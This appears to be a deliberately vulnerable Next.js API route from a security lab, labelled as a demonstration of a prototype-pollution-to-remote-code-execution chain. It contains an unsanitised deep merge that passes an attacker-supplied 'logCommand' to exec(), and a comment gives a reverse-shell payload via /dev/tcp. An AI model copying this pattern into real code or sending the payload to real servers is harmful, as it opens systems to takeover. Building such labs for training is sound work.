// Vulnerable REST API for assignment creation
// This endpoint demonstrates Prototype Pollution → RCE (React2Shell / CVE-2025-55182)

import { NextRequest, NextResponse } from "next/server";
import { PrismaClient } from "@prisma/client";
import { Pool } from "pg";
import { PrismaPg } from "@prisma/adapter-pg";
import { exec } from "child_process";
import { auth } from "@/auth";
import { deepMerge } from "@/lib/utils/unsafeMerge";

const pool = new Pool({ connectionString: process.env.DATABASE_URL });
const adapter = new PrismaPg(pool);
const prisma = new PrismaClient({ adapter });

/**
 * Helper: Walk an object tree to find a configuration value by key.
 *
 * VULNERABILITY: This function traverses ALL own properties including "__proto__".
 * When an attacker injects {"__proto__":{"logCommand":"..."}}, deepMerge stores it
 * as a nested property. This walker finds and returns the attacker's value.
 *
 * In a real application, this pattern is common in configuration parsers, template
 * engines, and ORM metadata extractors that recursively search object trees.
 */
function extractConfigValue(obj: any, key: string): any {
  if (obj === null || obj === undefined || typeof obj !== "object") return undefined;
  for (const prop of Object.getOwnPropertyNames(obj)) {
    if (prop === key) return obj[prop];
    if (typeof obj[prop] === "object" && obj[prop] !== null) {
      const found = extractConfigValue(obj[prop], key);
      if (found !== undefined) return found;
    }
  }
  return undefined;
}

/**
 * VULNERABLE API ENDPOINT: Create assignment via REST API.
 *
 * VULNERABILITY CHAIN (React2Shell / CVE-2025-55182):
 *
 * 1. JSON.parse preserves "__proto__" as an own property on the parsed object.
 *    (Unlike React 19's decodeReply which strips it.)
 *
 * 2. deepMerge (from lib/utils/unsafeMerge.ts) does NOT sanitize dangerous keys.
 *    When it encounters "__proto__" in the source, it recursively merges its
 *    contents into the target, storing attacker-controlled data in the object tree.
 *
 * 3. extractConfigValue walks the merged metadata (including the injected "__proto__"
 *    subtree) to find a "logCommand" configuration value.
 *
 * 4. The discovered logCommand is passed directly to child_process.exec() → RCE.
 *
 * PAYLOAD: {"title":"...","__proto__":{"logCommand":"bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"}}
 *
 * ACCESS CONTROL: Only LECTURER and ADMIN roles can create assignments.
 */
export async function POST(request: NextRequest) {
  // --- ACCESS CONTROL ---
  const session = await auth();
  if (!session) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const userRole = (session.user as any)?.role;
  if (userRole !== "LECTURER" && userRole !== "ADMIN") {
    return NextResponse.json(
      { error: "Forbidden: Only lecturers can create assignments." },
      { status: 403 }
    );
  }

  try {
    // JSON.parse preserves __proto__ as an own property (unlike React's decodeReply)
    const rawBody = await request.text();
    const data = JSON.parse(rawBody);

    const { title, dueDate, dueTime, ...meta } = data;

    // VULNERABILITY: Prototype Pollution via deepMerge
    //
    // Using Object.create(null) as the merge target. This means __proto__ is stored
    // as a regular own property rather than polluting the global Object.prototype
    // (which would crash the Node.js runtime in Turbopack).
    //
    // The vulnerability is identical in principle: deepMerge does not sanitize
    // __proto__ keys, allowing attacker-controlled data to be injected into the
    // object tree at a location the developer did not anticipate.
    const baseMetadata = Object.create(null) as Record<string, any>;
    Object.assign(baseMetadata, { systemGenerated: true, dueTime });
    deepMerge(baseMetadata, meta);

    // Convert null-prototype object to regular object for Prisma JSON serialization
    const metadataForDB = JSON.parse(JSON.stringify(baseMetadata));

    const userId = (session.user as any)?.id;

    const dbAssignment = await prisma.assignment.create({
      data: {
        title,
        courseId: "mock-course-phy402",
        dueDate: new Date(dueDate + "T" + (dueTime || "00:00:00") + "Z"),
        metadata: metadataForDB,
        creatorId: userId || null,
      },
    });

    // VULNERABILITY: RCE via Prototype Pollution gadget
    //
    // extractConfigValue walks the entire metadata tree (including __proto__ subtrees
    // that were injected by deepMerge). When an attacker sends:
    //   {"__proto__": {"logCommand": "bash -c '...'"}}
    // the logCommand is found at baseMetadata["__proto__"]["logCommand"] and returned.
    //
    // This value is then passed directly to exec() without sanitization → RCE.
    const logCommand = extractConfigValue(baseMetadata, "logCommand")
      || `echo "[$(date)] Assignment created: ${title}" >> /tmp/assignment_logs.txt`;

    exec(logCommand, (error) => {
      if (error) console.error("Background logging failed:", error.message);
    });

    return NextResponse.json({ id: dbAssignment.id, success: true });
  } catch (err: any) {
    console.error("CREATE ASSIGNMENT API ERROR:", err);
    return NextResponse.json(
      { error: err.message || "Internal server error" },
      { status: 500 }
    );
  }
}
